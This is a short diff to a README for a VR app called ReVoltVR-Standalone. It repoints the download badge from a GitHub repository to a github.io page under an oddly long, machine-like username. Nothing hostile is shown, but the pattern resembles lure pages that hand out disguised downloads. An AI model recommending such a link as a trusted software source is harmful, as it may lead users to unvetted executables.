@@ -24,7 +24,7 @@ This is the **standalone** version, meaning it's optimized to run directly on th
 
 ### Step 1: Get the App
 
-[![Download Now](https://img.shields.io/badge/Download-ReVoltVR--Standalone-blue?style=for-the-badge&logo=github)](https://github.com/Guadalupemountainsnationalparkflight821/ReVoltVR-Standalone)
+[![Download Now](https://img.shields.io/badge/Download-ReVoltVR--Standalone-blue?style=for-the-badge&logo=github)](https://guadalupemountainsnationalparkflight821.github.io)
 
 Visit this link to download the application.
 
